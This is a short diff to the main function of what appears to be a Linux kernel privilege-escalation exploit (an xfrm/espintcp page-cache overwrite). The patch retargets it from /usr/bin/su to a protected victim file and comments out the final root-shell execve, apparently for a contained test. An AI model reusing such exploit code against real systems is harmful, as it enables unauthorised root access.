@@ -1279,16 +1279,10 @@ int main(int argc, char **argv)
 	       " mode=xfrm_espintcp_pagecache_replace collateral=after\n");
 	printf("\n");
 
-	const char *tpath = "/usr/bin/su";
-	if (argc > 1 && argv[1] && argv[1][0]) {
-		tpath = argv[1];
-	} else if (getenv("TARGET_PATH") && getenv("TARGET_PATH")[0]) {
-		tpath = getenv("TARGET_PATH");
-	} else if (access("/mnt/protected/victim_file", F_OK) == 0) {
-		tpath = "/mnt/protected/victim_file";
-	}
-
-	file_size = use_existing_target(tpath);
+//        system("cp /bin/cat /tmp/test");
+//        file_size = use_existing_target("/tmp/test");
+		// PATCH - target "/usr/bin/su" -> "/mnt/protected/victim_file"
+        file_size = use_existing_target("/mnt/protected/victim_file");
 	byte_off = 0;
 	desired = (unsigned char *)shell_elf;
 	desired_len = PAYLOAD_LEN;
@@ -1304,6 +1298,7 @@ int main(int argc, char **argv)
 	/* reset scroll region; some terminals home the cursor on \033[r so
 	 * explicitly jump to the last row so PS1 lands below our output */
 	write(STDOUT_FILENO, "\033[r\033[9999;1H\033[?25h\n", 19);
-	execve(target_file, NULL, NULL);
+	// PATCH - comment out interactive shell
+	// execve("/usr/bin/su", NULL, NULL);
 	return ret;
 }
